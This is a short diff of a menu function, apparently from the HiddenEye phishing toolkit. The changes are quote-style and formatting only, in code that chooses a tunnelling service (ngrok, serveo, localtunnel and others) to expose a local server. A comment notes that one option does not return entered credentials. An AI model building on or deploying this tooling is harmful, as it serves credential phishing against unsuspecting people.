@@ -17,7 +17,7 @@ default_palette = theme.default_palette
 
 
 def server_selection(port):  # Question where user must select server
-    run_command('clear')
+    run_command("clear")
     # print('''
     #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
     #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
@@ -31,32 +31,31 @@ def server_selection(port):  # Question where user must select server
     print(global_localization.by_darksec)
     print(localization.lang_server_selection["server_selection"])
     print(localization.lang_server_selection["select_any_available_server"])
-    main_runner.print_sorted_as_menu(
-        localization.lang_server_selection["servers_list"])
+    main_runner.print_sorted_as_menu(localization.lang_server_selection["servers_list"])
     choice = input(global_localization.input_line)
     choice = choice.zfill(2)
-    if choice == '00':
-        run_command('clear')
+    if choice == "00":
+        run_command("clear")
         server_runner.start_localhost(port)  # FIXED
-    elif choice == '01':
-        run_command('clear')
+    elif choice == "01":
+        run_command("clear")
         server_runner.start_ngrok(port)  # FIXED
-    elif choice == '02':
-        run_command('clear')
+    elif choice == "02":
+        run_command("clear")
         server_runner.start_serveo(port)  # ALMOST FIXED
-    elif choice == '03':
-        run_command('clear')
+    elif choice == "03":
+        run_command("clear")
         # DOESN'T GET ENTERED CREDENTIALS BACK
         server_runner.start_localxpose(port)
-    elif choice == '04':
-        run_command('clear')
+    elif choice == "04":
+        run_command("clear")
         server_runner.start_localtunnel(port, True)
-    elif choice == '05':
-        run_command('clear')
+    elif choice == "05":
+        run_command("clear")
         server_runner.start_openport(port)
-    elif choice == '06':
-        run_command('clear')
+    elif choice == "06":
+        run_command("clear")
         server_runner.start_pagekite(port)
     else:
-        run_command('clear')
+        run_command("clear")
         return server_selection(port)
